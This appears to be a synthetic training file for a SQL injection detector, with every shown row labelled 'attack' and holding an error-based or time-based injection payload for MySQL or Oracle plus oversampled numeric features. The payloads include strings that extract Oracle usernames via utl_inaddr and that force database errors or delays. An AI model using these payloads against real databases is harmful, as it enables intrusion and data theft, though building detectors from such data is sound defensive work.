id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000088,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000025,2.571412077163801,334.6740659565451,39.78830537528235,3.969541636916759,109.59610179176079,59.76881433408626,127.8857605812628,37.42338924943531,0.3277631474667746,0.1790487717380271,0.381524366382458,0.11166371441274033,1.6155928329568718,0.596101791760782,1.192203583521564,0.0,2.0,2.0,0.0,23.01949104119609,0.0,0.0,6.0,6.192203583521564,0.40389820823921796,0.596101791760782,0.596101791760782,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.596101791760782,1.0,1.0,0.4038982082392179,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000089,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.1778769480185483,271.2980195774739,36.796357842052636,3.9450298706137,97.9817892102632,35.0,101.74172547284223,36.574504894368474,0.36149582696233296,0.12924723173978822,0.3746562553512612,0.13460068594661767,0.20364215794736062,3.1854313682105575,0.0,0.0,2.0,1.7963578420526394,0.0,19.59271568410528,1.5927156841052783,2.0,5.20364215794736,3.7963578420526396,0.20364215794736068,0.7963578420526394,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.7963578420526393,0.7963578420526394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.59271568410528
SMOTE_000090,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.4509690671838684,228.05315050241794,41.46860004901639,4.293249016281518,128.381650379877,2.0,73.20290007352457,24.468600049016388,0.5615517526548168,0.008833198384443547,0.3222513775828816,0.10736367137785807,3.0,0.0,0.0,0.0,0.0,3.367150012254096,0.0,10.0,0.0,5.101450036762289,1.0,3.367150012254097,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.367150012254096,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.367150012254096
SMOTE_000091,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,2.674973611882315,210.7992888652634,35.1983406856146,3.8456079341745175,68.6033186287708,37.0,82.1959702364926,23.0,0.325687197589325,0.17553097210402757,0.3896679827825221,0.10911384752412526,1.6009481796487983,0.0,0.5997629550878003,0.0,0.5997629550878005,1.4002370449121995,0.0,14.3990518203512,0.0,0.0,3.800474089824399,2.5997629550878,0.4002370449121996,0.0,0.0,0.5997629550878005,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4002370449121996,0.5997629550878004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5997629550878004,0.0,1.0,1.0,5.5997629550878
SMOTE_000092,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.99501587217554,286.67613624726994,40.732386375273,4.077682899179068,114.5069603465483,35.49303965345171,103.14090899781596,33.535227249453996,0.4039945867939808,0.12092077507475216,0.35837120888110596,0.11671342925016102,1.3661931876365023,0.0,1.6338068123634981,0.0,1.633806812363498,2.3661931876365023,0.0,18.169034061817488,0.0,2.915482969091255,4.267613624726996,5.633806812363498,1.0,0.0,0.8169034061817491,0.0,0.0,1.0,1.0,0.0,0.0,0.816903406181749,0.0,2.816903406181749,0.0,1.183096593818251,2.0,0.3661931876365021,0.816903406181749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8169034061817488,0.0,0.0,0.0,0.0,0.0,0.816903406181749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.816903406181749,0.0,0.0,0.0,9.633806812363497
SMOTE_000093,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,1.3887588618451772,222.1552263863166,32.05241811090533,3.9364068949334357,79.10483622181066,41.209672443621315,77.7882996099793,24.05241811090533,0.3567038469433617,0.18507091490661964,0.3498666486457874,0.10835858950423122,2.947581889094672,0.0,0.0,0.0,0.0,2.0,0.0,13.052418110905329,0.0,0.0,5.0,3.052418110905328,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5262090554526642,0.0,0.5262090554526643,0.0,0.47379094454733583,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.526209055452664
SMOTE_000094,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.0529212096763159,235.3356335503002,40.261169593517415,3.8755807679715133,71.29095517623053,43.02978558271311,96.01489279135656,25.0,0.3026054154088344,0.18253597045320247,0.40842880787882696,0.10642980625913616,0.24627680216086145,0.7537231978391384,1.0,0.0,1.0,1.7537231978391383,0.0,16.246276802160864,0.0,0.0,3.0,3.753723197839138,0.24627680216086162,0.7537231978391385,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7537231978391385,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.753723197839138
SMOTE_000095,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,0.7857085258032137,233.53281560445024,31.0,3.672657372607813,69.9906241130142,37.0,96.53281560445025,30.009375886985783,0.30070889382991745,0.15870804963630997,0.41235127567096047,0.12823178086281214,0.4953120565071072,3.5046879434928915,0.0,0.0,0.0,2.0,0.0,17.257031915239338,1.7523439717464462,0.0,5.0,2.0,0.12382801412677691,0.8761719858732231,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000096,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,0.3390869353670556,346.6960293209888,35.848014660494414,3.7158901720499498,97.8601099537081,48.07599266975279,140.60794135802234,60.151985339505586,0.282232137615705,0.1386726716209472,0.4055881865073837,0.17350700425596416,0.0,4.0,0.9240073302472074,0.0,0.0,3.0,0.0,28.151985339505586,0.15198533950558518,2.772021990741622,0.07599266975279306,23.924007330247207,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0759926697527926,0.9240073302472074,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000097,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,2.676272639306013,201.88820470983427,31.0,3.6535858338995313,65.26470262870578,27.288226834635015,83.56469156630541,25.770583680188082,0.32528199862368873,0.13385401255928558,0.41341353387144025,0.12745045494558546,2.9882378970353805,1.0117621029646195,0.0,0.0,0.0,0.5058810514823098,0.0,16.505881051482312,0.5058810514823098,0.0,4.252940525741155,0.5058810514823104,0.7470594742588451,0.2529405257411549,0.0,0.0,0.0,0.2529405257411549,1.0,0.0,0.0,1.0,0.0,0.25294052574115455,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7470594742588451,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.25294052574115494,0.25294052574115494,3.5058810514823096
SMOTE_000098,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,3.453817418025984,239.92976602766856,38.2341137031037,4.121089372516371,113.02675583198332,16.568561949394482,82.47826092982595,27.856187316464826,0.48080799778923317,0.06163675273578162,0.3424635240411305,0.11509172543385475,3.4414715742240753,0.0,0.0,0.0,0.8829431484481503,2.5585284257759247,0.0,13.531772593792601,0.0,3.11705685155185,2.7658862968963005,3.4414715742240745,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4414715742240751,0.0,2.441471574224075,0.0,0.558528425775925,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44147157422407507,0.0,0.0,0.0,0.0,0.0,0.4414715742240751,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4414715742240751,0.0,0.0,0.0,8.324414722672225
SMOTE_000099,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,2.9667695267126755,210.66831089880753,34.892725430550904,3.853634748240944,69.21454913889819,37.0,81.45376175990934,23.0,0.32879797848744113,0.17564034704216216,0.38637983711986346,0.10918183735053325,1.7755854682566274,0.0,0.5561036329358431,0.0,0.5561036329358431,1.443896367064157,0.0,14.22441453174337,0.0,0.0,3.887792734128314,2.5561036329358426,0.4438963670641569,0.0,0.0,0.5561036329358432,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.44389636706415697,0.5561036329358431,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5561036329358431,0.0,1.0,1.0,5.556103632935843
SMOTE_000100,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,1.6695983995724033,319.8432323639103,38.38017957577279,3.9943149081241915,108.81802466649924,55.0,119.36395066700152,36.66125703040957,0.3409240703791627,0.1720859648850413,0.3725694986282002,0.11442046610759578,4.0,0.0,0.0,0.0,2.0,1.3801795757727962,0.0,21.520718303091186,0.7603591515455924,0.0,6.0,4.380179575772797,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.3801795757727962,0.6198204242272036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000101,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,2.4659250521081217,272.17185490415005,38.059720435924454,4.001098082358575,100.69409141675447,39.1194408718489,99.29860217962225,33.05972043592445,0.37052529030109216,0.14349542189772865,0.36428785695512095,0.12169143084605819,1.0,0.0,1.0298602179622258,0.0,2.0,1.5149301089811127,0.0,19.029860217962224,0.0,2.0,5.485069891018886,4.544790326943338,1.0,0.0,0.5149301089811128,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.5149301089811128,2.0,0.0,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.029860217962225
SMOTE_000102,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.5312761658629837,269.58725053247747,36.735258947588484,3.9501951175935566,97.6762947379424,35.0,100.76414316141569,36.14681263311937,0.3627244840690528,0.13011535283898465,0.37333458526962743,0.13382557782233512,0.26474105241151946,2.941035790353922,0.0,0.0,2.0,1.7352589475884805,0.0,19.47051789517696,1.470517895176961,2.0,5.2647410524115195,3.7352589475884805,0.2647410524115194,0.7352589475884808,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.7352589475884806,0.7352589475884805,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.470517895176961
SMOTE_000103,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,2.5264156564663707,223.34794604551053,38.8502282171655,4.140813429414187,110.38881224870161,11.485617208384642,76.17397302275526,25.299543565669,0.4999171770961539,0.047094303472951085,0.340259669374505,0.11272885005639,2.4251141085827492,0.0,0.0,0.0,0.5748858914172508,2.4251141085827492,0.0,12.299543565669003,0.0,3.4251141085827497,2.437214728543127,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.2874429457086254,0.0,2.287442945708625,0.0,0.7125570542913746,2.0,1.4251141085827492,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2874429457086254,0.0,0.0,0.0,0.0,0.0,0.2874429457086254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2874429457086254,0.0,0.0,0.0,7.287442945708626
SMOTE_000104,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.40271354918395186,295.0383347790871,37.805424893297534,4.022970813885843,109.34611159302904,42.221699573190136,106.15153648632656,37.318987126541366,0.37073063343279844,0.14306374131802269,0.35974994363797275,0.12645568161120618,3.7081373399463007,0.0,0.0,0.0,2.0,1.9027124466487668,0.0,19.805424893297534,0.0,2.0,5.097287553351233,5.7081373399463,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.902712446648767,0.0,0.9027124466487668,2.0,0.0,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.708137339946301
SMOTE_000105,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.8943338787818615,332.2561035557127,34.11584466643098,3.5349850079356973,85.09143044358025,48.62805177785634,141.90856955641976,56.62805177785634,0.256150730334862,0.14635413813628953,0.427062977265668,0.17043215426318045,0.6280517778563406,0.0,0.3719482221436594,0.0,0.0,2.0,0.0,29.88415533356902,0.0,1.1158446664309785,0.6280517778563408,22.371948222143658,0.6280517778563406,0.0,0.0,0.3719482221436594,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6280517778563406,0.3719482221436593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000106,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,2.830236046157645,263.2991201640662,36.510682863002366,3.9691805829252877,96.55341431501182,35.0,97.17092580803785,34.57478004101655,0.3672405560004019,0.13330623279047862,0.3684766333434754,0.1309765778656441,0.4893171369976348,2.042731452009461,0.0,0.0,2.0,1.5106828630023652,0.0,19.02136572600473,1.0213657260047302,2.0,5.489317136997634,3.5106828630023657,0.4893171369976348,0.5106828630023652,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.5106828630023652,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.021365726004731
SMOTE_000107,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.991245603483898,337.99308356997693,34.0,3.4897873201643455,81.19723342799077,52.997694523325634,146.39907780933027,57.39907780933025,0.24018444787018126,0.1567470133874225,0.4332341225152154,0.16983441622718082,0.0,0.19953890466512747,1.1995389046651275,0.0,0.0,2.1995389046651272,0.0,30.800461095334875,0.0,0.0,1.0,23.399077809330254,0.0,0.19953890466512747,0.19953890466512744,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1995389046651275,1.0,0.19953890466512747,0.8004610953348725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.199538904665127
SMOTE_000108,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,1.4594729592854436,231.7012321358434,32.103909971699295,3.64406008707547,65.90905207924197,37.66234598301958,98.01296205094127,30.116872022640564,0.2838703735149295,0.16311147578196616,0.4231086704401407,0.12990948026296367,0.0,3.337654016980424,0.44156398867971686,0.0,0.22078199433985846,2.0,0.0,17.558436011320282,1.5584360113202829,0.0,4.779218005660142,2.6623459830195753,0.0,1.0,0.22078199433985846,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4415639886797171,0.0,0.2207819943398586,0.22078199433985846,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7792180056601415,0.7792180056601415,5.441563988679717
SMOTE_000109,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000030,3.085419312175491,226.13433211622808,38.34541644932644,3.7945155618257096,63.91258250744048,42.34541644932644,93.81449973919173,26.061833420269423,0.28112504252025555,0.1872908347273179,0.4156247291580676,0.11595939359435897,0.0,1.0,1.5309167101347114,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.5309167101347114,4.530916710134711,0.0,1.0,0.5309167101347114,0.4690832898652886,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.061833420269423,0.0,1.0,0.5309167101347114,0.5309167101347114,0.46908328986528847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.46908328986528847,0.0,0.4690832898652886,0.4690832898652886,7.0
SMOTE_000110,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,1.5300933743688951,196.79679005513253,31.0,3.65662445493348,64.72306277182261,25.879963206738786,81.18147619601949,25.012287880551654,0.3302328972488966,0.13062558400970883,0.41217701205736984,0.12696450668402473,3.421549782541911,0.5784502174580884,0.0,0.0,0.0,0.2892251087290443,0.0,16.289225108729045,0.2892251087290442,0.0,4.144612554364522,0.2892251087290454,0.8553874456354779,0.14461255436452214,0.0,0.0,0.0,0.14461255436452225,1.0,0.0,0.0,1.0,0.0,0.14461255436452225,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8553874456354778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1446125543645222,0.1446125543645222,3.2892251087290436
SMOTE_000111,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,0.12545123162932287,342.760053476455,33.976005347645504,3.536091320945583,83.9280160429365,49.0,147.952010695291,61.880026738227514,0.2448582548499374,0.1429600800186808,0.43165368068333176,0.18052798444805002,0.023994652354498047,3.904021390582008,0.0,0.0,0.0,2.976005347645502,0.0,30.023994652354496,1.9520106952910035,0.0,1.0,22.9760053476455,0.023994652354498047,0.976005347645502,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.976005347645502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.976005347645502
